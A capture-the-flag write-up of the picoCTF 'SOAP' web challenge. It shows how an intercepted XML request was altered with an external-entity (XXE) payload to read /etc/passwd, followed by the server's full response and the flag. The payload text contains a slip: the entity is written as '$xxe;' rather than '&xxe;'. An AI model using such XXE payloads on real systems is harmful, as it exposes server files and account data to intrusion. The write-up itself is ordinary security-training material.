# SOAP

**100 points**

AUTHOR: GEOFFREY NJOGU

Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Additional details will be available after launching your challenge instance.

___

I opened the website with `BurpSuite` and used proxy to see the requests to modify them.

Intercepting the request done by clicking on the `Details` button I could modify the `xml` data to perform an `XXE` attack just like the question suggests. 

*Reasource for the question:* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) - it literally had the syntax to perform the attack, goated site.

So changing the parameters for the xml from:

```html
<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```

To:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>$xxe;</ID></data>
```

We successfully tricked the website to show the contents of `/etc/passwd` onto the screen and instead of the details. We get:

```
Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
```

And at the bottom we can see flag is:

> picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
